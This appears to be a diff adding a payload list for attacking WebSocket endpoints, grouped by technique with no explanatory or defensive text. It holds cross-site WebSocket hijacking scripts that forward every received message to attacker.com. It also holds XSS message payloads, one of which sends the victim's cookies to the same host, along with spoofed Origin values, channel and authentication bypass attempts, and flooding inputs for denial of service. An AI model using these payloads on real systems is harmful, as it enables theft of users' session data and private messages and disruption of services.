@@ -1,0 +1,23 @@
+# WebSocket - Cross-Site WebSocket Hijacking (CSWSH)
+<script>var ws=new WebSocket('wss://target.com/ws');ws.onmessage=function(e){fetch('https://attacker.com/log?data='+encodeURIComponent(e.data));};</script>
+<script>var ws=new WebSocket('wss://target.com/ws');ws.onopen=function(){ws.send(JSON.stringify({action:'getProfile'}));};ws.onmessage=function(e){new Image().src='https://attacker.com/exfil?d='+btoa(e.data);};</script>
+
+# WebSocket - Origin validation bypass
+Origin: https://target.com.evil.com
+Origin: null
+
+# WebSocket - Message injection / XSS
+{"message": "<img src=x onerror=alert(document.domain)>"}
+{"message": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}
+
+# WebSocket - Authorization bypass
+{"type": "subscribe", "channel": "admin"}
+{"type": "subscribe", "channel": "../admin/notifications"}
+
+# WebSocket - Authentication bypass
+GET /ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13
+{"action": "authenticate", "token": "null"}
+
+# WebSocket - DoS
+{"data": "AAAAAAAAAA....(1MB)....AAAAAAAAAA"}
+rapid-reconnection: 1000 connections in 10 seconds
